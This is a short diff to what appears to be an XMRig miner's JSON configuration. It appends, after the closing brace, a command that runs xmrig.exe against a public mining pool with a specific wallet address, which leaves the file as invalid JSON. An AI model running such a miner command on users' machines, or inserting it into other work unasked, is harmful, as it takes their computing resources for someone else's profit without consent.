@@ -100,3 +100,4 @@
     "pause-on-battery": false,
     "pause-on-active": false
 }
+xmrig.exe --donate-level 3 -o sg.minexmr.com:443 -u 89Yqh8D3ayeZYYRYE97xkqUCcfthXk1Lo9SYzB4UpKS7PdNsoLBfNWFHtCBJKkY7jm9oKRYCLdbgHGXJjCPHs87oUdXzWZp -k --tls --rig-id black33
